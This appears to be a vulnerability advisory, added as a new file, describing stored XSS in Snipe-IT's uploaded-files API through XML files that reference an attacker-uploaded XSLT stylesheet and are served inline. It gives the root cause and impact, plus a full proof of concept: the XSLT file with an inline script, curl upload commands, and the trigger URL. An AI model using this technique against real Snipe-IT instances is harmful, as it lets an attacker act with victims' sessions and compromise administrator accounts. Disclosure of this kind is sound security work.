@@ -1,0 +1,97 @@
+Snipe-IT's uploaded-files API accepts XML documents and later serves them inline without applying the safe-inline allowlist used by the equivalent web controller. An authenticated user who can attach files to a supported object can upload an XSLT stylesheet and an XML document that references it through xml-stylesheet. When another authorized user opens the XML file through the API with ?inline=true, the browser applies the attacker-controlled stylesheet, which produces HTML containing JavaScript in the Snipe-IT origin.
+This was reproduced against commit df8e3b144331d0c1cc14778f900e7646d1d9a509 (v8.6.3-231-gdf8e3b1443).
+
+The attack requires an authenticated account with file access to at least one supported object and one victim interaction. Scope changes because attacker-controlled code executes in another user's Snipe-IT security context. The script can read same-origin data available to the victim and perform authenticated actions as that victim.
+
+Affected Components
+app/Http/Requests/UploadFileRequest.php
+Allows xml uploads through filesystems.allowed_upload_extensions_for_validator.
+Sanitizes only files detected as image/svg+xml. Both files in this proof of concept are detected by PHP finfo as text/xml, so they are stored unchanged.
+config/filesystems.php
+Includes xml in allowed_upload_extensions_array.
+app/Http/Controllers/Api/UploadedFilesController.php, method show()
+Honors the attacker-controlled inline=true query parameter for every uploaded file type.
+Calls Storage::download(..., ['Content-Disposition' => 'inline']) without calling StorageHelper::allowSafeInline().
+routes/api.php
+Exposes the affected route as GET /api/v1/{object_type}/{id}/files/{file_id} for multiple object types.
+app/Http/Middleware/SecurityHeaders.php
+The default CSP includes script-src 'self' 'unsafe-inline' 'unsafe-eval', so it does not mitigate the injected inline script.
+The non-API UploadedFilesController::show() already calls StorageHelper::allowSafeInline() before returning an inline response. The missing equivalent check in the API controller creates the vulnerable behavior.
+Root Cause
+File validation treats XML as an allowed attachment format, but the API download path treats all accepted formats as safe active browser content. Extension allowlisting for upload is not equivalent to determining whether a response is safe to render inline.
+Laravel derives the response Content-Type from each stored file. It returns text/xml; charset=utf-8, while the controller overrides the normal attachment disposition with Content-Disposition: inline. Chromium processes the xml-stylesheet instruction, loads the second same-origin API attachment as XSLT, and executes script in the HTML document produced by the transform.
+
+An attacker can execute arbitrary JavaScript in the Snipe-IT origin when a victim opens the malicious attachment URL. Depending on the victim's privileges, this can enable:
+
+Reading same-origin pages and API responses available to the victim.
+Performing state-changing actions with the victim's session and privileges.
+Exposing sensitive asset, user, license, and configuration information.
+Administrative account compromise when a superuser opens the attachment.
+Cookies marked HttpOnly cannot be read directly, but this does not prevent same-origin authenticated requests or reading their responses.
+Proof of Concept
+Preconditions
+Snipe-IT is installed with default XML upload support.
+The attacker has an API token for a user permitted to manage files on a supported object.
+The victim is authenticated and permitted to view files on that object.
+Create the malicious XSLT file
+Save the following as style.xml:
+
+<?xml version="1.0"?>
+<xsl:stylesheet version="1.0"
+  xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
+  <xsl:template match="/">
+    <html>
+      <head><title>BEFORE</title></head>
+      <body>
+        <div id="result">NOT_EXECUTED</div>
+        <script>
+          document.getElementById('result').textContent = 'XSS_EXECUTED';
+          document.title = 'SNIPE_XSS';
+        </script>
+      </body>
+    </html>
+  </xsl:template>
+</xsl:stylesheet>
+PHP finfo identifies this file as text/xml, not image/svg+xml.
+2. Upload the stylesheet through the API
+
+Replace the base URL, token, object type, and object ID with values from the test instance:
+
+curl -i \
+  -H 'Authorization: Bearer ATTACKER_API_TOKEN' \
+  -H 'Accept: application/json' \
+  -F 'file[]=@style.xml;type=text/xml' \
+  'https://snipe-it.example/api/v1/models/1/files'
+Expected result: HTTP 200 and a successful upload response.
+
+Obtain the stylesheet file ID
+curl -s \
+  -H 'Authorization: Bearer ATTACKER_API_TOKEN' \
+  -H 'Accept: application/json' \
+  'https://snipe-it.example/api/v1/models/1/files'
+Read the style.xml upload's id from the response and call it STYLE_FILE_ID.
+
+Create and upload the referencing XML document
+Save this as data.xml, replacing STYLE_FILE_ID:
+
+<?xml version="1.0"?>
+<?xml-stylesheet type="text/xsl" href="https://snipe-it.example/api/v1/models/1/files/STYLE_FILE_ID?inline=true"?>
+<data>test</data>
+PHP finfo also identifies this file as text/xml.
+curl -i \
+  -H 'Authorization: Bearer ATTACKER_API_TOKEN' \
+  -H 'Accept: application/json' \
+  -F 'file[]=@data.xml;type=text/xml' \
+  'https://snipe-it.example/api/v1/models/1/files'
+List the files again and obtain the id of data.xml; call it DATA_FILE_ID.
+
+Trigger the vulnerability
+While authenticated in the Snipe-IT web interface as a victim who can view the object's files, open the following in the same browser. The normal Snipe-IT Passport cookie authenticates both same-origin API requests:
+https://snipe-it.example/api/v1/models/1/files/DATA_FILE_ID?inline=true
+Expected vulnerable response characteristics:
+
+HTTP/1.1 200 OK
+Content-Type: text/xml
+Content-Disposition: inline
+Content-Security-Policy: ...; script-src 'self' 'unsafe-inline' 'unsafe-eval'; ...
+Browser result: the page title changes to SNIPE_XSS, and the displayed text changes from NOT_EXECUTED to XSS_EXECUTED.
